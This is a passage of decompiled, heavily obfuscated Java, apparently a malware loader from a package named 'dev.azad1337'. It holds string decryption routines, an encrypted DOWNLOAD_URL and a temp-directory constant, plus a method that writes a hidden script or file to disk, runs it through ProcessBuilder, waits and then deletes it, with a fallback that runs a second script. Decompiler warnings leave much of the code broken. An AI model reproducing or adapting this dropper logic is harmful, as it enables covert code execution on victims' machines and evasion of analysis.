    /* JADX WARN: Code restructure failed: missing block: B:21:0x0132, code lost:
    
        r0 = new java.lang.String(r2).intern();
     */
    /* JADX WARN: Code restructure failed: missing block: B:22:0x0140, code lost:
    
        switch(r0) {
            case 0: goto L9;
            default: goto L4;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x0032, code lost:
    
        r3 = r18;
        r18 = r18 + 1;
        r0[r3] = r0;
        r1 = r15 + r16;
        r15 = r1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:24:0x0046, code lost:
    
        if (r1 >= r19) goto L7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x0055, code lost:
    
        r17 = "ô+\u0098\u0095äPíD\u0013Zá\b\u0014LîJÚ²ï#";
        r19 = "ô+\u0098\u0095äPíD\u0013Zá\b\u0014LîJÚ²ï#".length();
        r16 = 11;
        r15 = -1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x0079, code lost:
    
        r4 = r18;
        r18 = r18 + 1;
        r0[r4] = r0;
        r2 = r15 + r16;
        r15 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x008d, code lost:
    
        if (r2 >= r19) goto L48;
     */
    /* JADX WARN: Code restructure failed: missing block: B:32:0x0090, code lost:
    
        r16 = r17.charAt(r15);
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x009c, code lost:
    
        dev.azad1337.p001IlIillIliIlIi.impl.C0011p.f47a = r0;
        dev.azad1337.p001IlIillIliIlIi.impl.C0011p.f48b = new java.lang.String[23];
        dev.azad1337.p001IlIillIliIlIi.impl.C0011p.DOWNLOAD_URL = m106a(-2087010388, 2087013115, (int) 99525190124315L);
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x0154, code lost:
    
        r2 = new long[5];
        r10 = 0;
        r11 = "Ë¾\u0016\u009bê\u0089-©E»iÒ¿C«Dæ*ö7l\u0089¢\u0081";
        r12 = "Ë¾\u0016\u009bê\u0089-©E»iÒ¿C«Dæ*ö7l\u0089¢\u0081".length();
        r9 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x0166, code lost:
    
        r3 = r9;
        r9 = r9 + 8;
        r2 = r11.substring(r3, r9).getBytes("ISO-8859-1");
        r3 = r10;
        r5 = -1;
        r4 = ((((((((r2[0] & 255) << 56) | ((r2[1] & 255) << 48)) | ((r2[2] & 255) << 40)) | ((r2[3] & 255) << 32)) | ((r2[4] & 255) << 24)) | ((r2[5] & 255) << 16)) | ((r2[6] & 255) << 8)) | (r2[7] & 255);
        r10 = r10 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x028e, code lost:
    
        r6 = r5;
        r5 = r4;
        r4 = r3;
        r5 = r5 ^ 99525190124315L;
     */
    /* JADX WARN: Code restructure failed: missing block: B:39:0x0295, code lost:
    
        switch(r4) {
            case 0: goto L38;
            default: goto L34;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:40:0x01e7, code lost:
    
        r6[r5] = r4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x01ea, code lost:
    
        if (r9 < r12) goto L54;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x01ed, code lost:
    
        r11 = ":§ý\\$\u001di1h5\u001e[qTtq";
        r12 = ":§ý\\$\u001di1h5\u001e[qTtq".length();
        r9 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x01f8, code lost:
    
        r4 = r9;
        r9 = r9 + 8;
        r3 = r11.substring(r4, r9).getBytes("ISO-8859-1");
        r3 = r2;
        r4 = r10 == true ? 1 : 0;
        r5 = ((((((((r3[0] & 255) << 56) | ((r3[1] & 255) << 48)) | ((r3[2] & 255) << 40)) | ((r3[3] & 255) << 32)) | ((r3[4] & 255) << 24)) | ((r3[5] & 255) << 16)) | ((r3[6] & 255) << 8)) | (r3[7] & 255);
        r10 = (r10 == true ? 1 : 0) + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x0279, code lost:
    
        r5[r4] = r5;
     */
    /* JADX WARN: Code restructure failed: missing block: B:47:0x027c, code lost:
    
        if (r9 < r12) goto L56;
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x027f, code lost:
    
        dev.azad1337.p001IlIillIliIlIi.impl.C0011p.f49c = r2;
        dev.azad1337.p001IlIillIliIlIi.impl.C0011p.f50d = new java.lang.Integer[5];
     */
    /* JADX WARN: Code restructure failed: missing block: B:4:0x00c8, code lost:
    
        if (r2 <= 1) goto L15;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x02b5, code lost:
    
        r5 = 99525190124318L ^ 99525190124315L;
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x02af, code lost:
    
        dev.azad1337.p001IlIillIliIlIi.impl.C0011p.f51e = r6;
     */
    /* JADX WARN: Code restructure failed: missing block: B:53:0x02c0, code lost:
    
        dev.azad1337.p001IlIillIliIlIi.impl.C0011p.TEMP_DIR = call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "î"}
            {METHOD_TYPE: (Ljava/lang/Object;, J, J)Ljava/lang/String;}
        ).invoke(m106a((-2087027610) - (-17219), (-2087027610) - (-8533), (int) 99525190124315L), -8981004108420020853L, 99525190124315L);
     */
    /* JADX WARN: Code restructure failed: missing block: B:54:0x02e1, code lost:
    
        return;
     */
    /* JADX WARN: Code restructure failed: missing block: B:5:0x00cb, code lost:
    
        r3 = r2;
        r4 = r21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:6:0x00ce, code lost:
    
        r5 = r3[r4];
     */
    /* JADX WARN: Code restructure failed: missing block: B:7:0x00d5, code lost:
    
        switch((r21 % 7)) {
            case 0: goto L18;
            case 1: goto L19;
            case 2: goto L20;
            case 3: goto L21;
            case 4: goto L22;
            case 5: goto L23;
            default: goto L24;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:8:0x00fc, code lost:
    
        r6 = '>';
     */
    /* JADX WARN: Code restructure failed: missing block: B:9:0x011b, code lost:
    
        r3[r4] = (char) (r5 ^ r6);
        r21 = r21 + 1;
        r3 = r1;
        r2 = r2;
        r1 = r3;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r10v0 */
    /* JADX WARN: Type inference failed for: r10v1, types: [int] */
    /* JADX WARN: Type inference failed for: r10v3 */
    /* JADX WARN: Type inference failed for: r10v7 */
    /* JADX WARN: Type inference failed for: r10v8 */
    /* JADX WARN: Type inference failed for: r1v2 */
    /* JADX WARN: Type inference failed for: r1v29 */
    /* JADX WARN: Type inference failed for: r1v3 */
    /* JADX WARN: Type inference failed for: r4v22 */
    /* JADX WARN: Type inference failed for: r4v23 */
    /* JADX WARN: Type inference failed for: r4v34 */
    /* JADX WARN: Type inference failed for: r4v43 */
    /* JADX WARN: Type inference failed for: r5v39 */
    /* JADX WARN: Type inference failed for: r5v40 */
    /* JADX WARN: Type inference failed for: r5v42, types: [long] */
    /* JADX WARN: Type inference failed for: r5v70 */
    /* JADX WARN: Type inference failed for: r6v20, types: [long] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:19:0x012f -> B:5:0x00cb). Please report as a decompilation issue!!! */
    static {
        int i;
        String[] strArr = new String[23];
        int i2 = 0;
        String str = "Ù\u0080\u000ecÀ¶ç ö\u00ad\nULóÍG\u001e\u0010 \u0091Ïå\u0098ÞS(s\u0097Á\u0080<)ù7\u0002\b\u0081RÕ\f Ømq¢Âë}Ï\u0089\u0004\u0095)î\u008bÂ¹êª%bà>xÿÄs\u0015_UZ£Ø«Ê;o\u001a0ÉÇµ[5s\u0011'ùÉæjá%ð\u000b\u0015\u001b\u0012\u008cÿ£-\u001d\u0019\bÊ\u008cò|Ý©ßJ9\u0081U¦ÇwÁ\u0007rX\u0097-Ó\u0001\u001d\b\u0005l`Á±²#Z\nÅù©\u00831#ôÖmì\u0005ù\u0081ÈkÀ\u0007ãä\u009b õf³\u0003AèX\u0002þ_\u0003ã\u0002\u009c\u000b\u008dS| g<>|3:1RfÍVà£v{\"Ða¨\nèå´à8\u0003ÏÒd\"»��\u0005d\u0098G\u009feÂ[éb®\u0093\u0004<¶ú\u000bÕ 6·Eî\u001f\u00948¿Þ¤æü\u00100\t|\u0091`\u008f>#®Ø~òBõ¥=\u0092Ã-ºm%;ÉÄ��\u0004i(5z\b\u0005ÿ¯\u0089þòd\rF\u0089á÷\u0006³¹\u009eÇÈ/Ã \u0097õHqÔ³'åñ·\u0083±è\u0092\u008eH·eH¡¢|%\u0001â\u0002\fü¦\u0007©>Õ\u0012¡TÜz\u0080\u0098ÊV¸D7è\u0096\u000e~\u0092¿ãø\u008b^»á\u008a\u000b\u0095Á§��M\u0006\u0014°ìyí\u0002\u008dm\u00046ªþÈ";
        int length = "Ù\u0080\u000ecÀ¶ç ö\u00ad\nULóÍG\u001e\u0010 \u0091Ïå\u0098ÞS(s\u0097Á\u0080<)ù7\u0002\b\u0081RÕ\f Ømq¢Âë}Ï\u0089\u0004\u0095)î\u008bÂ¹êª%bà>xÿÄs\u0015_UZ£Ø«Ê;o\u001a0ÉÇµ[5s\u0011'ùÉæjá%ð\u000b\u0015\u001b\u0012\u008cÿ£-\u001d\u0019\bÊ\u008cò|Ý©ßJ9\u0081U¦ÇwÁ\u0007rX\u0097-Ó\u0001\u001d\b\u0005l`Á±²#Z\nÅù©\u00831#ôÖmì\u0005ù\u0081ÈkÀ\u0007ãä\u009b õf³\u0003AèX\u0002þ_\u0003ã\u0002\u009c\u000b\u008dS| g<>|3:1RfÍVà£v{\"Ða¨\nèå´à8\u0003ÏÒd\"»��\u0005d\u0098G\u009feÂ[éb®\u0093\u0004<¶ú\u000bÕ 6·Eî\u001f\u00948¿Þ¤æü\u00100\t|\u0091`\u008f>#®Ø~òBõ¥=\u0092Ã-ºm%;ÉÄ��\u0004i(5z\b\u0005ÿ¯\u0089þòd\rF\u0089á÷\u0006³¹\u009eÇÈ/Ã \u0097õHqÔ³'åñ·\u0083±è\u0092\u008eH·eH¡¢|%\u0001â\u0002\fü¦\u0007©>Õ\u0012¡TÜz\u0080\u0098ÊV¸D7è\u0096\u000e~\u0092¿ãø\u008b^»á\u008a\u000b\u0095Á§��M\u0006\u0014°ìyí\u0002\u008dm\u00046ªþÈ".length();
        char c = 2;
        int i3 = -1;
        while (true) {
            int i4 = i3 + 1;
            String substring = str.substring(i4, i4 + c);
            ?? r1 = -1;
            while (true) {
                String str2 = substring;
                String str3 = r1;
                char[] charArray = str2.toCharArray();
                int length2 = charArray.length;
                int i5 = 0;
                char[] cArr = charArray;
                int i6 = length2;
                i4 = i + 1;
                r1 = str.substring(i4, i4 + c);
            }
            c = str.charAt(i3);
        }
    }

    /* renamed from: n */
    private void m104n(Object[] a) {
        File a2 = (File) a[0];
        String a3 = (String) a[1];
        long a4 = ((Long) a[2]).longValue();
        try {
            File a5 = new File((String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-8373064874992379111L, a4) /* invoke-custom */, m106a(1643617800 + 6425, (-1643617800) - 22996, (int) a4));
            (Path) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Path.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Path) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Path.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, -8428931792199862327L, a4) /* invoke-custom */, (byte[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(byte[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(m106a(1643617800 + 6430, 1643617800 + 22605, (int) a4) + (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a2, -8375199084222950930L, a4) /* invoke-custom */ + m106a(1643617800 + 6445, (-1643617800) - 5406, (int) a4) + a3 + m106a(1643617800 + 6450, (-1643617800) - 22485, (int) a4), -8362042518213762412L, a4) /* invoke-custom */, new OpenOption[0], -8364698052914636726L, a4) /* invoke-custom */;
            ProcessBuilder a6 = new ProcessBuilder(m106a(1643617800 + 6454, (-1643617800) - (-6846), (int) a4), m106a(1643617800 + 6431, 1643617800 + 12839, (int) a4), (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, -8375199084222950930L, a4) /* invoke-custom */);
            (ProcessBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(ProcessBuilder.class, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a6, true, -8422820573857716158L, a4) /* invoke-custom */;
            (ProcessBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(ProcessBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a6, new File((String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-8373064874992379111L, a4) /* invoke-custom */), -8428899258911757689L, a4) /* invoke-custom */;
            (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Process) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Process.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a6, -8422318757128064091L, a4) /* invoke-custom */, f51e, (TimeUnit) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(TimeUnit.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-8376430190036992419L, a4) /* invoke-custom */, -8420258875122504517L, a4) /* invoke-custom */;
            (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, -8369292834683987159L, a4) /* invoke-custom */;
        } catch (Exception e) {
            try {
                File a7 = new File((String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-8373064874992379111L, a4) /* invoke-custom */, m106a(1643617800 + 6442, 1643617800 + 13522, (int) a4));
                (Path) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Path.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Path) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Path.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a7, -8428931792199862327L, a4) /* invoke-custom */, (byte[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(byte[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke("\"" + (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a2, -8375199084222950930L, a4) /* invoke-custom */ + m106a(1643617800 + 6444, 1643617800 + 18759, (int) a4) + a3 + m106a(1643617800 + 6452, (-1643617800) - 23897, (int) a4), -8362042518213762412L, a4) /* invoke-custom */, new OpenOption[0], -8364698052914636726L, a4) /* invoke-custom */;
                (Process) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Process.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((ProcessBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(ProcessBuilder.class, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new ProcessBuilder(m106a(1643617800 + 6451, (-1643617800) - (-702), (int) a4), m106a(1643617800 + 6428, 1643617800 + 7470, (int) a4), m106a(1643617800 + 6455, (-1643617800) - 10487, (int) a4), m106a(1643617800 + 6447, 1643617800 + 21253, (int) a4), (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a7, -8375199084222950930L, a4) /* invoke-custom */), true, -8422820573857716158L, a4) /* invoke-custom */, -8422318757128064091L, a4) /* invoke-custom */;
            } catch (Exception e2) {
            }
        }
    }
}
